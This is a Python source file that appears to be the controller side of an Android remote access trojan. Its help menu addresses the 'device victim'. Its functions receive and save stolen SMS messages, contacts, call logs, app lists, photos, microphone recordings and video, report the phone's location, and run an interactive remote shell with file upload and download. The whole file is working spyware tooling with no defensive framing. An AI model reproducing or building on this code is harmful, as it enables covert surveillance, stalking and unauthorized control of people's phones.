import sys
import os
import base64
import time
import binascii
import select
import pathlib
import platform
import re
from subprocess import PIPE, run
from colorama import Fore, Style,init

def clearDirec():
    if(platform.system() == 'Windows'):
        clear = lambda: os.system('cls')
        direc = "\\"
        init(convert=True)
    else:
        clear = lambda: os.system('clear')
        direc = "/"
    return clear,direc

clear,direc = clearDirec()
if not os.path.isdir(os.getcwd()+direc+"fields"):
    os.makedirs("fields")

def executeCMD(command):
	result = run(command, stdout=PIPE, stderr=PIPE, universal_newlines=True, shell=True)
	return result

def getpwd(name):
	return os.getcwd()+direc+name;

class color :
	reset 	= Fore.RESET
	blue 	= Fore.BLUE
	red 	= Fore.RED
	green	= Fore.GREEN

def help() :
	print (" ")
	print ("	 Commands 			Description")
	print ("	----------			------------")
	print ("	app_list("+color.red+"new"+color.reset+")		        list of all app in text file")
	print ("	cam_list		        list of camera that exist")
	print ("	dump_calllogs		        dump Call Logs in text file")
	print ("	dump_contacts		        dump Contacts in text file")
	print ("	dump_sms (inbox|sent)	        dump Sms inbox or sent in text file")
	print ("	getIP			        get IP of device victim")
	print ("	geolocate		        get Location of device based gps & network")
	print ("	MACaddress		        get MAC address of device victim")
	print ("	beep | number ("+color.red+"new"+color.reset+")	        beep target with given freq.")
	print ("	simInfo			        get information of sim data")
	print ("	shell			        enter the interactive shell of device victim")
	print ("	record_mic		        start record stream audio ")
	print ("	startVideo		        start record stream video ")
	print ("	stop_mic		        stop stream audio and save it to .wav file")
	print ("	stopVideo		        stop strean video and save it to .mp4 file")
	print ("	sysInfo			        get Info of device victim")
	print ("	takepic (cam)		        take photo from device")
	print ("	vibrate | number	        vibrate device in number of time (max.9 times)")
	print ("	clear			        clear screen")
	print ("	back			        back to server")
	print ("	exit			        exit the client")
	print (" ")

def recvall(sock) :
	buff = " "
	data = " "
	while "END123" not in data :
		data = sock.recv(20480).decode("UTF-8","ignore")
		buff+=data   
	return buff

def recvallShell(sock) :
	buff = " "
	data = " "
	ready = select.select([sock], [], [], 3)
	while "END123" not in data:
		if ready[0] :
			data = sock.recv(20480).decode("UTF-8","ignore")
			buff += data
		else :
			buff = "bogus"
			return buff
	return buff
	
def getFile(filename,ext,data) :
	fileData = "fields"+direc+filename+"."+ext
	flag = 0
	with open(fileData, 'wb') as file :
		try :
			rawFile = base64.b64decode(data)
			file.write(rawFile)
			print(color.blue+"Succesfully Downloaded in "+getpwd(fileData)+"\n"+color.reset)
		except binascii.Error :
			flag = 1
			print("Not able to decode the Audio File")
	if flag == 1 :
		os.remove(filename)

def putFile(filename) :
	data = open(filename, "rb").read()
	encoded = base64.b64encode(data)
	return encoded

def readSMS(client,data):
	print("Collecting "+data+" SMS")
	msg = "start"
	timex = time.strftime("%Y%m%d-%H%M%S")
	filename = "fields"+direc+data+"_"+timex+'.txt'
	flag =0
	with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
		msg = recvall(client)
		try:
			txt.write(msg)
			print(color.blue+"SMS Collected in "+getpwd(filename)+"\n"+color.reset)
		except UnicodeDecodeError:
			flag = 1
			print("Not able to decode the SMS")
	if flag == 1:
		os.remove(filename)

def stop_mic(client):
	print("Downloading Audio")
	timestr = time.strftime("%Y%m%d-%H%M%S")
	data= ""
	flag =0
	data=recvall(client)
	data = data.strip().replace("END123","").strip()
	filename = "fields"+direc+"Audio_"+timestr+".wav"
	with open(filename, 'wb') as audio:
		try :
			audioData = base64.b64decode(data)
			audio.write(audioData)
			print(color.blue+"Audio saved in "+getpwd(filename)+color.reset)
			print (" ")
		except binascii.Error:
			flag=1
			print("Not able to decode the Audio File")
	if flag == 1:
		os.remove(filename)

def callLogs(client):
	print("Colleccting Call Logs")
	msg = "start"
	timex = time.strftime("%Y%m%d-%H%M%S")
	msg = recvall(client)
	filename = "fields"+direc+"dump_CallLogs-"+timex+'.txt'
	if "No CallLogs" in msg :
		msg.split("\n")
		print(msg.replace("END123", "").strip())
		print(" ")
	else :
		with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
			txt.write(msg)
			txt.close()
			print(color.blue+"CallLogs Collected in "+getpwd(filename)+"\n"+color.reset)
			if not os.path.getsize(filename):
    				os.remove(filename)

def getImage(client):
	print("Taking Image")
	timex = time.strftime("%Y%m%d-%H%M%S")
	flag=0
	filename ="fields"+direc+"Image_"+timex+'.jpg'
	imageBuffer=recvall(client) 
	imageBuffer = imageBuffer.strip().replace("END123","").strip()
	if imageBuffer=="":
		print("Unable to Connect to Camera")
		return
	with open(filename,'wb') as img:
		try :
			imgdata = base64.b64decode(imageBuffer)
			img.write(imgdata)
			print(color.blue+"Image Saved in "+getpwd(filename)+color.reset+"\n")
		except binascii.Error as e:
			flag=1
			print(e)
			print("Not able to decode the Image")
	if flag == 1:
		os.remove(filename)

def shell(client):
	msg = "start"
	command = "ad"
	while True:
		msg = recvallShell(client)
		if "getFile" in msg:
			msg=" "
			msg1 = recvall(client)
			msg1 = msg1.replace("\nEND123\n","")
			filedata = msg1.split("|_|")
			getFile(filedata[0],filedata[1],filedata[2])
		if "putFile" in msg:
			msg=" "
			sendingData=""
			filename = command.split(" ")[1].strip()
			file = pathlib.Path(filename)
			if file.exists():
				encoded_data = putFile(filename).decode("UTF-8")
				filedata = filename.split(".")
				sendingData+="putFile"+"<"+filedata[0]+"<"+filedata[1]+"<"+encoded_data+"END123\n"
				client.send(sendingData.encode("UTF-8"))
				print(color.blue+"Succesfully Uploaded the file in /sdcard/tmp/"+color.reset)
			else :
				print ("File not exist")
		if "Exiting" in msg:
			 print(color.red+"channel closed\n"+color.reset)
			 return
		msg = msg.split("\n")
		for i in msg[:-2]:
			 print(i)
		command = input("\nsky("+color.red+"shell"+color.reset+"):~$ ")
		command = command+"\n"
		if command.strip() == "clear":
			client.send("test\n".encode("UTF-8"))
			clear()
		else :
			client.send(command.encode("UTF-8")) 

def dump_contacts(client) :
	print ("Collecting Contacts")
	msg = "start"
	timex = time.strftime("%Y%m%d-%H%M%S")
	msg = recvall(client)
	filename = "fields"+direc+"dump_Contacts-"+timex+'.txt'
	if "No contacts" in msg :
		msg.split("\n")
		print(msg.replace("END123","").strip())
		print(" ")
	else :
		with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
			txt.write(msg)
			txt.close()
			print(color.blue+"Contacts Collected in "+getpwd(filename)+"\n"+color.reset)
			if not os.path.getsize(filename):
    				os.remove(filename)

def app_list(client) :
	print ("Listing App")
	msg = "start"
	timex = time.strftime("%Y%m%d-%H%M%S")
	msg = recvall(client)
	filename = "fields"+direc+"list_app-"+timex+'.txt'
	if "failed to list installed app" in msg :
		msg.split("\n")
	else :
		with open(filename, 'w',errors="ignore", encoding="utf-8") as txt:
			txt.write(msg)
			txt.close()
			print(color.blue+"Listed app in "+getpwd(filename)+"\n"+color.reset)
			if not os.path.getsize(filename):
    				os.remove(filename)


def geolocate(sock) :
	msg = "start"
	while True :
		msg = recvall(sock)
		msg = msg.split("\n")
		for i in msg[:-2] :
			print(i)
		if("END123" in msg):
			return

def stopVideo(client):
	print(Style.BRIGHT+Fore.YELLOW+"Downloading Video"+Fore.RESET)
	timestr = time.strftime("%Y%m%d-%H%M%S")
	data = " "
	flag = 0
	data=recvall(client)
	data = data.strip().replace("END123","").strip()
	filename = "fields"+direc+"Video_"+timestr+'.mp4'
	with open(filename, 'wb') as video:
		try :
			videoData = base64.b64decode(data)
			video.write(videoData)
			print(color.blue+"Succesfully Saved in "+getpwd(filename)+"\n"+color.reset)
			print (" ")
		except binascii.Error:
			flag = 1
			print(Style.BRIGHT+Fore.RED+"Not able to decode the Video File\n"+Fore.RESET)
	if flag == 1:
		os.remove("Video_"+timestr+'.mp4')
   

	
	
	









